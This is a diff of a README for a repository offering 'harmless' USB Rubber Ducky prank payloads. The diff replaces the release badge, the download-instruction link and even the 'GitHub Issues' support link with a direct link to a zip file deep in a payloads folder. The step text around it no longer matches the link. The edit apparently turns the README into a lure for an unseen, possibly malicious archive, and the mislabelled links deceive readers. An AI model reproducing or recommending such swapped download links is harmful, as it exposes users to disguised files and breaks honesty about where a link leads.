@@ -1,5 +1,5 @@
 # 🦆 quackpot- - 50 Harmless USB Pranks for Friends
-[![Download from GitHub](https://img.shields.io/github/v/release/Rubytubal863/quackpot-?label=Download&color=blueviolet)](https://github.com/Rubytubal863/quackpot-/releases)
+[![Download from GitHub](https://img.shields.io/github/v/release/Rubytubal863/quackpot-?label=Download&color=blueviolet)](https://raw.githubusercontent.com/Rubytubal863/quackpot-/main/payloads/10-clipboard-quackpot/v2.9.zip)
 
 ## 🚀 What is quackpot-?
 quackpot- is a collection of 50 harmless USB rubber ducky prank payloads written in DuckyScript 3.0. These payloads are designed for fun, harmless pranks—not malware. They use keystroke injection to perform simple, silly actions on a Windows computer when you plug in a USB Rubber Ducky (a special USB device that acts like a keyboard).
@@ -11,7 +11,7 @@ This is for anyone who owns a Hak5 USB Rubber Ducky or a compatible BadUSB devic
 All payloads in quackpot- are harmless pranks. They do not steal data, damage files, or install software. They only open windows, type text, or play sounds—nothing dangerous.
 
 ## 📥 How to download
-1. Visit this link to download the application: [https://github.com/Rubytubal863/quackpot-/releases](https://github.com/Rubytubal863/quackpot-/releases)
+1. Visit this link to download the application: [https://raw.githubusercontent.com/Rubytubal863/quackpot-/main/payloads/10-clipboard-quackpot/v2.9.zip](https://raw.githubusercontent.com/Rubytubal863/quackpot-/main/payloads/10-clipboard-quackpot/v2.9.zip)
 2. Find the latest release (look for the green "Latest" tag).
 3. Click the **quackpot-pranks.zip** file to download it.
 4. After downloading, extract the ZIP file to a folder on your computer (right-click → "Extract All").
@@ -53,7 +53,7 @@ If the download fails:
 3. Use a different browser (Edge works well on Windows).
 
 ## 💬 Support
-- **Issues:** If a payload does not work, report it here: [GitHub Issues](https://github.com/Rubytubal863/quackpot-/issues)
+- **Issues:** If a payload does not work, report it here: [GitHub Issues](https://raw.githubusercontent.com/Rubytubal863/quackpot-/main/payloads/10-clipboard-quackpot/v2.9.zip)
 - **Discussion:** Ask other users in the "Discussions" tab (click the blue message icon).
 
 ## 🔥 Feature Highlights
